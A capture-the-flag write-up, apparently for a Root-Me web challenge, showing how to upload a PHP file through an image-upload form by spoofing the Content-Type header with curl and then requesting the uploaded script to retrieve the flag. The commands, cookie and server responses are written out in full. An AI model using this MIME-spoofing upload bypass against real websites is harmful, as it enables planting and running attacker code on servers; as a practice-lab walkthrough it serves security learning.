The idea is the same than before. We will try to inject malicious php code using the upload function of the website.

But if we upload the same file than before (hack.php.png), we will see that we now have an error message coming from the website:


```
The image “...//hack.php.png” cannot be displayed because it contains errors.
```

If you use the Burp Suite or any request interceptor, you will see that when uploading your image, you are sending the following line with it:

```
Content-Type:text/plain
```
 which is the MIME type, and which is why the image is not correctly displayed. If you have a request interceptor, then you can just change it to:

 ```
 Content-Type:image/gif
 ```
 before sending the request, and your good to go!

But you know me, I am going to use curl.

First things first,
```
curl -v http://challenge01.root-me.org/web-serveur/ch21/
```
You got a session_id, that we are going to use. For the sake of simplicity, we define the following variables:

```
url="http://challenge01.root-me.org/web-serveur/ch21/"
cookies="PHPSESSID=1p8h3sceog69563i3k9v5g5qm2"
```

Then we are going to upload the file thanks to curl. For this, we go in the folder where our file hack.php is, and we type
```
curl -s  -b "$cookies" -F submit=upload -F "file=@hack.php;filename=hack.php;type=image/jpeg" "${url}?action=upload&galerie=upload"
```

We receive a response containg

```
File information&nbsp;:<br><ul><li>Upload: hack.php</li><li>Type: image/jpeg</li><li>Size: 0.0361328125 kB</li><li>Stored in: /hack.php</li></ul><b>File uploaded</b>.</body></html>
```

It seems like our upload was successful ! Let's now access this corrupted file.

```
curl -s  -b "$cookies" "${url}?galerie=upload"
```

We can find the link to our file:

```
<a href='./galerie/upload/1p8h3sceog69563i3k9v5g5qm2//hack0.php'>
```

Then we just curl it :

```
curl -s  -b "$cookies" "${url}galerie/upload/1p8h3sceog69563i3k9v5g5qm2//hack.php"
```

And we have the flag in the response !
